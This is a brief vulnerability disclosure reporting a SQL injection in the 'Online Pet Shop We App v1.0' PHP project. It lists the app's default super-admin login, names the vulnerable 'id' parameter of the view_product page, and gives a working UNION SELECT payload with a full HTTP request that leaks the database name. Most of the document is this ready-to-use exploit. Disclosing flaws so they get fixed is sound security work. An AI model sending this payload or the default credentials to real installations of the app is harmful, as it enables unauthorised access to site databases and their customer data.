# Online Pet Shop We App v1.0 by oretnom23 has SQL injection

BUG_Author: Cokutau-CH

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/14839/online-pet-shop-we-app-using-php-and-paypal-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /pet_shop/?p=view_product&id=

Vulnerability location: /pet_shop/?p=view_product&id=,id

dbname=pet_shop_db,length=11

[+] Payload: /pet_shop/?p=view_product&id=-e4da3b7fbbce2345d7772b0674a318d5%27%20union%20select%201,2,3,database(),5,6,7--+ // Leak place ---> id

```sql
GET /pet_shop/?p=view_product&id=-e4da3b7fbbce2345d7772b0674a318d5%27%20union%20select%201,2,3,database(),5,6,7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=39d40bnp4n4treun1nco3uocnm
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/184599136-a659b45e-e436-4922-89af-b64e09fcd6d4.png)
